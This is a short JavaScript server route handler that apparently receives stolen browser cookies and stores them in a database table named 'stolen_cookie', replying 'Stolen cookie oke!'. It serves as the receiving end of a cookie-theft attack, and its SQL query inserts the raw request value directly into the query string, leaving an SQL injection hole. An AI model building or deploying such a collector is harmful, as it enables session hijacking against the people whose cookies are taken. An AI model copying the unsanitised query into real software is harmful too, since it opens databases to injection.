export const postCookie = async (req, res) => {
    try {
        const cookie = req.body.cookie;
        const query = `
            INSERT INTO stolen_cookie(content)
            VALUES ('${cookie}')
        `;

        await db.query(query);

        res.status(200).json({
            code: "success",
            message: "Stolen cookie oke!"
        })
    } catch (error) {
        console.log(error);
        res.status(400).json({
            code: "error",
            message: "Bad request"
        })
    }
}